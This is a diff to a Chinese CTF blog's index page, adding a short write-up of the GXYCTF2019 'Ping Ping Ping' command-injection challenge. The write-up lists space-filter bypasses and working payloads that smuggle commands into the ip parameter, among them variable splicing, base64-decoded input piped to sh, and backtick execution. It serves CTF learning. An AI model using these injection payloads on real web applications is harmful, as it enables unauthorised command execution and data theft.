@@ -143,7 +143,7 @@
         <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
         <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">19</span></a></li>
         <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">8</span></a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">48</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">49</span></a></li>
         <li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
         <li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
       <li class="menu-item menu-item-search">
@@ -217,7 +217,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">48</span>
+          <span class="site-state-item-count">49</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -273,6 +273,178 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/948949cb/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Haorical">
+      <meta itemprop="description" content="ctf退役种子选手">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="中国熊猫的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/posts/948949cb/" class="post-title-link" itemprop="url">20210519</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-05-19 20:15:37" itemprop="dateCreated datePublished" datetime="2021-05-19T20:15:37+08:00">2021-05-19</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-08-27 01:42:22" itemprop="dateModified" datetime="2021-08-27T01:42:22+08:00">2021-08-27</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">ctf每日一题</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/posts/948949cb/" class="post-meta-item leancloud_visitors" data-flag-title="20210519" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Changyan：</span>
+    
+    
+      <a title="changyan" href="/posts/948949cb/#SOHUCS" itemprop="discussionUrl">
+        <span id="url::http://haorical.xyz/posts/948949cb/" class="cy_cmt_count" data-xid="posts/948949cb/" itemprop="commentCount"></span>
+      </a>
+    
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>588</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><blockquote>
+<p>远程命令执行 绕过</p>
+</blockquote>
+<p>对空格进行了过滤绕过方法：</p>
+<ul>
+<li>${IFS}替换</li>
+<li>$IFS$1替换</li>
+<li>${IFS替换</li>
+<li>%20替换</li>
+<li>&lt;和&lt;&gt;重定向符替换</li>
+<li>%09替换</li>
+</ul>
+<p>cat绕过</p>
+<pre><code>(1)more:一页一页的显示档案内容
+
+(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页
+
+(3)head:查看头几行
+
+(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
+
+(5)tail:查看尾几行
+
+(6)nl：显示的时候，顺便输出行号
+
+(7)od:以二进制的方式读取档案内容
+
+(8)vi:一种编辑器，这个也可以查看
+
+(9)vim:一种编辑器，这个也可以查看
+
+(10)sort:可以查看
+
+(11)uniq:可以查看
+
+(12)file -f:报错出具体内容
+</code></pre>
+<p>先执行</p>
+<pre><code>127.0.0.1|ls
+</code></pre>
+<p>看到有flag.php和index.php</p>
+<p>cat发现把空格过滤，这有个绕过，$IFS$1替换，又把flag给过滤了，然后看index的源码，继续绕过。</p>
+<p>1 变量拼接</p>
+<p>payload</p>
+<pre><code>?ip=1;a=g;cat$IFS$1fla$a.php
+</code></pre>
+<p>2 base64编码</p>
+<p>payload</p>
+<pre><code>?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
+</code></pre>
+<p>3 内敛绕过</p>
+<pre><code>?ip=127.0.0.1;cat$IFS$1`ls`
+</code></pre>
+<p>将反引号里面的结果作为命令执行</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1460,7 +1632,7 @@ while os.path.exists(p1) or os.path.exists(p2):
 <h1 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h1><p><strong>本项目仅供学习交流使用，如作他用所承受的任何直接、间接法律责任一概与作者无关</strong><br><strong>如果此项目侵犯了您或者您公司的权益，请立即联系我删除</strong></p>
 <p>如果你有不懂的,或者需要api不会搭建的,欢迎联系我,我会看心情给你解答（狗头）</p>
 <blockquote>
-<p>邮箱： <a href="mailto:&#105;&#x6b;&#97;&#101;&#x6b;&#x6b;&#107;&#64;&#x64;&#x69;&#x6e;&#x67;&#116;&#x61;&#108;&#x6b;&#x2e;&#x63;&#111;&#109;">&#105;&#x6b;&#97;&#101;&#x6b;&#x6b;&#107;&#64;&#x64;&#x69;&#x6e;&#x67;&#116;&#x61;&#108;&#x6b;&#x2e;&#x63;&#111;&#109;</a></p>
+<p>邮箱： <a href="mailto:&#105;&#107;&#x61;&#101;&#107;&#x6b;&#107;&#64;&#x64;&#105;&#110;&#103;&#x74;&#97;&#108;&#107;&#x2e;&#99;&#x6f;&#x6d;">&#105;&#107;&#x61;&#101;&#107;&#x6b;&#107;&#64;&#x64;&#105;&#110;&#103;&#x74;&#97;&#108;&#107;&#x2e;&#99;&#x6f;&#x6d;</a></p>
 </blockquote>
 
       
@@ -1530,7 +1702,7 @@ while os.path.exists(p1) or os.path.exists(p2):
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:28</span>
+    <span title="站点阅读时长">3:29</span>
   </span>
 </div>
 <div class="busuanzi-count">
